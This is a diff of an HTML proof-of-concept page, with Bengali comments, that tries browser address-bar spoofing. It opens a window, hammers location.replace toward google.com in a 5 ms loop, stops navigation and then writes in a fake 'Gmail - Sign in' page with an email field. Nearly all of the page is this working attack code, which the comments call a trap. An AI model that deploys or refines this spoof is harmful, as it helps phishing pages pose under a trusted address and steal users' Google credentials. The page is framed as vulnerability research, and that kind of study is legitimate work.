@@ -1,16 +1,62 @@
 <html>
     <head>
-        <title>Address Bar Spoof!</title>
+        <title>Omnibar State Confusion Test</title>
     </head>
     <body>
+        <h3>Advanced Address Bar Spoofing Research Lab</h3>
+        <!-- বাটনে ক্লিক করলেই অটোমেটিক জিমেইলের ফেক ট্র্যাপে নিয়ে যাবে -->
+        <button onclick="triggerAutoGmailSpoof();">Test Vulnerability</button>
+
         <script>
-            function demo() {
-            var evilPage = 'PGh0bWw+Cjx0aXRsZT4KZ29vZ2xlLmNvbQo8L3RpdGxlPgo8Ym9keT4KPGgzPkFkZHJlc3MgQmFyIFNwb29mIC1AQzBkM0czM2s8L2gzPgo8L2JvZHk+CjwvaHRtbD4=';
-                var x = window.open('','');
-                setInterval(function(){x.location.replace('https://www.google.com:8080');});
-                x.document.write(atob(evilPage));
+            function triggerAutoGmailSpoof() {
+                // ১. জিমেইল ডোমেইনের একটি ডেড বা নন-স্ট্যান্ডার্ড পোর্ট টার্গেট করা
+                // এর ফলে ব্রাউজারের নেটওয়ার্ক লেয়ার কানেকশন রেডি করতে একটু সময় নেবে (Race Condition)
+                var targetUrl = 'google.com'; 
+                
+                // ২. প্রথমে একটি ব্ল্যাঙ্ক উইন্ডো রেফারেন্স তৈরি করা
+                var x = window.open('', '_blank');
+                
+                if(x) {
+                    // ৩. দ্রুত একটি আগ্রাসী লুপ চালানো যা ব্রাউজারের অম্নিবার থ্রেডকে অনবরত কমান্ড পাঠাবে
+                    var confuseLoop = setInterval(function(){
+                        try {
+                            x.location.replace(targetUrl);
+                        } catch(e) {
+                            // ক্রস-অরিজিন ডিফেন্স ব্লক করলে ক্যাচ করবে
+                        }
+                    }, 5); // ৫ মিলিমেকেন্ড ফ্রিকোয়েন্সি যাতে থ্রেড ফ্রিজ হয়
+
+                    // ৪. ঠিক নেটওয়ার্ক রিকোয়েস্ট ফায়ার হওয়ার মুহূর্তে উইন্ডো স্টপ করে ডাটা পুশ করা
+                    setTimeout(function(){
+                        clearInterval(confuseLoop); // লুপ থামানো
+                        
+                        try {
+                            x.window.stop(); // ব্রাউজারকে বাধ্য করা নেভিগেশন পজ করতে
+                            
+                            // ৫. এখন জিমেইলের একটি ফেক UI ডকুমেন্টে পুশ করা
+                            x.document.open();
+                            x.document.write(`
+                                <html>
+                                <head>
+                                    <title>Gmail - Sign in</title>
+                                </head>
+                                <body style="font-family: sans-serif; text-align: center; padding-top: 80px; background-color: #f5f5f5;">
+                                    <div style="display: inline-block; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
+                                        <h2 style="color: #4285f4; margin-bottom: 5px;">Google</h2>
+                                        <p style="font-size: 16px; color: #202124;">Sign in to continue to Gmail</p>
+                                        <input type="text" placeholder="Email or phone" style="width: 100%; padding: 12px; margin: 20px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;"><br>
+                                        <button style="background: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold;">Next</button>
+                                    </div>
+                                </body>
+                                </html>
+                            `);
+                            x.document.close();
+                        } catch(err) {
+                            console.log("Modern browser security layer blocked UI rewrite.");
+                        }
+                    }, 350); // ব্রাউজারের রেন্ডারিং টাইমিং অনুযায়ী এটি ২৫০ms থেকে ৪৫০ms পর্যন্ত টিউন করা লাগতে পারে
+                }
             }
         </script>
-        <button onclick="demo();">test</button>
     </body>
 </html>
